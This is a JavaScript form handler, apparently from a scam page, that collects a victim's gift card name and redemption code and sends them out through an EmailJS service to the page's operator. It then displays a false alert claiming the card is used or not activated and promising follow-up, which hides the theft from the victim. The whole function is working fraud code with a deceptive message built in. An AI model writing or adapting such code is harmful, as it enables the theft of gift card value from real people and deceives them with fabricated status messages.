function sendMail() {
    let nameField = document.getElementById("giftCardName");
    let codeField = document.getElementById("giftCardCode");

    let name = nameField.value.trim();
    let code = codeField.value.trim();

    if (name === "" || code === "") {
        alert("Please fill in both fields before submitting.");
        return; // Stop the function if fields are empty
    }

    let parms = {
        cardname: name,
        cardcode: code,
    };

    emailjs.send("service_fhrssju", "template_j6p348r", parms)
        .then(() => {
            alert("⚠️This gift card appears to be used or not activated. We'll verify and contact you soon..");
            nameField.value = ""; // Clear name field
            codeField.value = ""; // Clear code field
        })
        .catch(error => alert("Error sending email: " + error));
}
